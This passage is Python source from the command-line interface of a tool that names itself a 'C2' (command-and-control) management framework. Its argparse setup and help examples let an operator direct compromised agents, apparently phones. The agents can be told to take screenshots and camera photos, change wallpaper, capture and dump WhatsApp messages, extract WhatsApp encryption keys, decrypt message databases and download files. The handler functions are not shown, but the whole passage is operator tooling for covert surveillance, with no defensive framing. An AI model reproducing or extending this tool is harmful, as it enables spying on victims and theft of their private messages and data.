                    print_error("Usage: wallpaper set <agent_id> <image>")
                    continue
            elif parts[0] == 'wa':
                if len(parts) > 2:
                    action = parts[1]
                    if action in ['start', 'stop', 'dump', 'list', 'decrypt']:
                        args_list = ['wa', action, '-a', parts[2]]
                    elif action == 'backup':
                        args_list = ['wa', 'backup-info', '-a', parts[2]]
                    else:
                        print_error(f"Unknown action: {action}")
                        continue
                else:
                    print_error("Usage: wa <start|stop|dump|list|backup> <agent_id>")
                    continue
            elif parts[0] == 'stats':
                args_list = ['db', 'stats']
            elif parts[0] == 'cleanup':
                args_list = ['db', 'cleanup']
            else:
                print_error(f"Unknown command: {parts[0]}")
                print("Type 'help' for available commands")
                continue
            
            # Execute command
            sys.argv = ['cli.py'] + args_list
            main()
            
        except KeyboardInterrupt:
            print()
            print_success("Exited")
            break
        except Exception as e:
            print_error(f"Error: {e}")

# ==================== MAIN ====================

def main():
    parser = argparse.ArgumentParser(
        description='LazyFramework C2 CLI Management Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  # Interactive Mode
  python cli.py --interactive

  # Agents
  python cli.py agents list
  python cli.py agents show abc123

  # Commands
  python cli.py command send -a abc123 -c GET_DEVICE_INFO
  python cli.py command list

  # Results
  python cli.py results list -a abc123
  python cli.py results show 42

  # Screenshots
  python cli.py screenshot take -a abc123
  python cli.py screenshot list -a abc123

  # Camera
  python cli.py camera snapshot -a abc123
  python cli.py camera list -a abc123

  # Wallpaper
  python cli.py wallpaper set -a abc123 -i image.jpg

  # WhatsApp Capture
  python cli.py wa start -a abc123
  python cli.py wa stop -a abc123
  python cli.py wa dump -a abc123
  python cli.py wa list -a abc123

  # WhatsApp Decrypt
  python cli.py wa backup-info -a abc123
  python cli.py wa extract-key -a abc123
  python cli.py wa decrypt-db -a abc123
  python cli.py wa decrypted-list -a abc123

  # Database
  python cli.py db stats
  python cli.py db cleanup --days 30
  python cli.py db export -o backup.json
        '''
    )
    
    # Global options
    parser.add_argument('--interactive', '-i', action='store_true', help='Interactive mode')
    
    subparsers = parser.add_subparsers(dest='category', help='Command category')
    
    # ==================== AGENTS ====================
    agents_parser = subparsers.add_parser('agents', help='Manage agents')
    agents_sub = agents_parser.add_subparsers(dest='action', required=True)
    
    agents_list = agents_sub.add_parser('list', help='List all agents')
    agents_list.set_defaults(func=cmd_agents_list)
    
    agents_show = agents_sub.add_parser('show', help='Show agent details')
    agents_show.add_argument('agent_id', help='Agent ID')
    agents_show.set_defaults(func=cmd_agents_show)
    
    # ==================== COMMAND ====================
    command_parser = subparsers.add_parser('command', help='Manage commands')
    command_sub = command_parser.add_subparsers(dest='action', required=True)
    
    command_send = command_sub.add_parser('send', help='Send command')
    command_send.add_argument('-a', '--agent-id', help='Target agent ID', required=True)
    command_send.add_argument('-c', '--command', help='Command to execute', required=True)
    command_send.set_defaults(func=cmd_command_send)
    
    command_list = command_sub.add_parser('list', help='List pending commands')
    command_list.set_defaults(func=cmd_command_list)
    
    command_history = command_sub.add_parser('history', help='Command history')
    command_history.add_argument('-a', '--agent-id', help='Agent ID', required=True)
    command_history.set_defaults(func=cmd_command_history)
    
    # ==================== RESULTS ====================
    results_parser = subparsers.add_parser('results', help='Manage results')
    results_sub = results_parser.add_subparsers(dest='action', required=True)
    
    results_list = results_sub.add_parser('list', help='List results')
    results_list.add_argument('-a', '--agent-id', help='Agent ID', required=True)
    results_list.add_argument('--limit', type=int, default=20, help='Number of results to show')
    results_list.set_defaults(func=cmd_results_list)
    
    results_show = results_sub.add_parser('show', help='Show result detail')
    results_show.add_argument('result_id', type=int, help='Result ID')
    results_show.set_defaults(func=cmd_results_show)
    
    results_export = results_sub.add_parser('export', help='Export result')
    results_export.add_argument('result_id', type=int, help='Result ID')
    results_export.add_argument('-o', '--output', help='Output filename')
    results_export.set_defaults(func=cmd_results_export)
    
    # ==================== SCREENSHOT ====================
    screenshot_parser = subparsers.add_parser('screenshot', help='Screenshot commands')
    screenshot_sub = screenshot_parser.add_subparsers(dest='action', required=True)
    
    screenshot_take = screenshot_sub.add_parser('take', help='Take screenshot')
    screenshot_take.add_argument('-a', '--agent-id', help='Target agent ID', required=True)
    screenshot_take.set_defaults(func=cmd_screenshot_take)
    
    screenshot_list = screenshot_sub.add_parser('list', help='List screenshots')
    screenshot_list.add_argument('-a', '--agent-id', help='Agent ID', required=True)
    screenshot_list.set_defaults(func=cmd_screenshot_list)
    
    screenshot_get = screenshot_sub.add_parser('get', help='Get screenshot')
    screenshot_get.add_argument('-a', '--agent-id', help='Agent ID', required=True)
    screenshot_get.add_argument('--index', type=int, help='Index of screenshot')
    screenshot_get.add_argument('-o', '--output', help='Output filename')
    screenshot_get.set_defaults(func=cmd_screenshot_get)
    
    # ==================== CAMERA ====================
    camera_parser = subparsers.add_parser('camera', help='Camera commands')
    camera_sub = camera_parser.add_subparsers(dest='action', required=True)
    
    camera_snapshot = camera_sub.add_parser('snapshot', help='Take photo')
    camera_snapshot.add_argument('-a', '--agent-id', help='Target agent ID', required=True)
    camera_snapshot.set_defaults(func=cmd_camera_snapshot)
    
    camera_list = camera_sub.add_parser('list', help='List photos')
    camera_list.add_argument('-a', '--agent-id', help='Agent ID', required=True)
    camera_list.set_defaults(func=cmd_camera_list)
    
    # ==================== WALLPAPER ====================
    wallpaper_parser = subparsers.add_parser('wallpaper', help='Wallpaper commands')
    wallpaper_sub = wallpaper_parser.add_subparsers(dest='action', required=True)
    
    wallpaper_set = wallpaper_sub.add_parser('set', help='Set wallpaper')
    wallpaper_set.add_argument('-a', '--agent-id', help='Target agent ID', required=True)
    wallpaper_set.add_argument('-i', '--image', help='Image URL or file path', required=True)
    wallpaper_set.set_defaults(func=cmd_wallpaper_set)
    
    # ==================== WHATSAPP CAPTURE ====================
    wa_parser = subparsers.add_parser('wa', help='WhatsApp commands')
    wa_sub = wa_parser.add_subparsers(dest='action', required=True)
    
    wa_start = wa_sub.add_parser('start', help='Start WhatsApp capture')
    wa_start.add_argument('-a', '--agent-id', help='Target agent ID', required=True)
    wa_start.set_defaults(func=cmd_wa_start)
    
    wa_stop = wa_sub.add_parser('stop', help='Stop WhatsApp capture')
    wa_stop.add_argument('-a', '--agent-id', help='Target agent ID', required=True)
    wa_stop.set_defaults(func=cmd_wa_stop)
    
    wa_dump = wa_sub.add_parser('dump', help='Dump captured messages')
    wa_dump.add_argument('-a', '--agent-id', help='Target agent ID', required=True)
    wa_dump.set_defaults(func=cmd_wa_dump)
    
    wa_stats = wa_sub.add_parser('stats', help='Get capture statistics')
    wa_stats.add_argument('-a', '--agent-id', help='Target agent ID', required=True)
    wa_stats.set_defaults(func=cmd_wa_stats)
    
    wa_clear = wa_sub.add_parser('clear', help='Clear captured messages')
    wa_clear.add_argument('-a', '--agent-id', help='Target agent ID', required=True)
    wa_clear.set_defaults(func=cmd_wa_clear)
    
    wa_list = wa_sub.add_parser('list', help='List captured message files')
    wa_list.add_argument('-a', '--agent-id', help='Agent ID', required=True)
    wa_list.set_defaults(func=cmd_wa_list)
    
    wa_show = wa_sub.add_parser('show', help='Show captured messages')
    wa_show.add_argument('-a', '--agent-id', help='Agent ID', required=True)
    wa_show.set_defaults(func=cmd_wa_show)
    
    # ==================== WHATSAPP DECRYPT ====================
    wa_backup = wa_sub.add_parser('backup-info', help='Get backup info')
    wa_backup.add_argument('-a', '--agent-id', help='Target agent ID', required=True)
    wa_backup.set_defaults(func=cmd_wa_backup_info)
    
    wa_extract = wa_sub.add_parser('extract-key', help='Extract encryption key')
    wa_extract.add_argument('-a', '--agent-id', help='Target agent ID', required=True)
    wa_extract.set_defaults(func=cmd_wa_extract_key)
    
    wa_decrypt = wa_sub.add_parser('decrypt-db', help='Decrypt database')
    wa_decrypt.add_argument('-a', '--agent-id', help='Target agent ID', required=True)
    wa_decrypt.set_defaults(func=cmd_wa_decrypt_db)
    
    wa_decrypted_list = wa_sub.add_parser('decrypted-list', help='List decrypted databases')
    wa_decrypted_list.add_argument('-a', '--agent-id', help='Agent ID', required=True)
    wa_decrypted_list.set_defaults(func=cmd_wa_decrypted_list)
    
    wa_decrypted_get = wa_sub.add_parser('decrypted-get', help='Get decrypted database')
    wa_decrypted_get.add_argument('-a', '--agent-id', help='Agent ID', required=True)
    wa_decrypted_get.add_argument('--index', type=int, help='Index of database')
    wa_decrypted_get.add_argument('-o', '--output', help='Output filename')
    wa_decrypted_get.set_defaults(func=cmd_wa_decrypted_get)
    
    # ==================== WHATSAPP INFO ====================
    wa_info_list = wa_sub.add_parser('info-list', help='List info files')
    wa_info_list.add_argument('-a', '--agent-id', help='Agent ID', required=True)
    wa_info_list.set_defaults(func=cmd_wa_info_list)
    
    wa_info_show = wa_sub.add_parser('info-show', help='Show info')
    wa_info_show.add_argument('-a', '--agent-id', help='Agent ID', required=True)
    wa_info_show.set_defaults(func=cmd_wa_info_show)
    
    # ==================== DOWNLOADS ====================
    download_parser = subparsers.add_parser('download', help='Download commands')
    download_sub = download_parser.add_subparsers(dest='action', required=True)
    
    download_list = download_sub.add_parser('list', help='List downloads')
    download_list.add_argument('-a', '--agent-id', help='Agent ID', required=True)
    download_list.set_defaults(func=cmd_download_list)
    
    download_get = download_sub.add_parser('get', help='Get download')
    download_get.add_argument('-a', '--agent-id', help='Agent ID', required=True)
    download_get.add_argument('filename', help='Filename to download')
    download_get.add_argument('-o', '--output', help='Output filename')
    download_get.set_defaults(func=cmd_download_get)
    
    # ==================== DATABASE ====================
    db_parser = subparsers.add_parser('db', help='Database operations')
    db_sub = db_parser.add_subparsers(dest='action', required=True)
    
    db_stats = db_sub.add_parser('stats', help='Show statistics')
    db_stats.set_defaults(func=cmd_db_stats)
    
    db_cleanup = db_sub.add_parser('cleanup', help='Cleanup old data')
    db_cleanup.add_argument('--days', type=int, default=30, help='Delete data older than N days')
    db_cleanup.set_defaults(func=cmd_db_cleanup)
    
    db_export = db_sub.add_parser('export', help='Export data')
    db_export.add_argument('-o', '--output', help='Output filename')
    db_export.set_defaults(func=cmd_db_export)
    
    # ==================== PARSE ARGS ====================
    args = parser.parse_args()
    
    # Interactive mode
    if args.interactive:
        interactive_mode()
        return
    
    if not hasattr(args, 'func'):
        parser.print_help()
        sys.exit(0)
    
    try:
        args.func(args)
    except KeyboardInterrupt:
        print("\nInterrupted")
        sys.exit(0)
    except Exception as e:
        print_error(str(e))
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == '__main__':
    main()
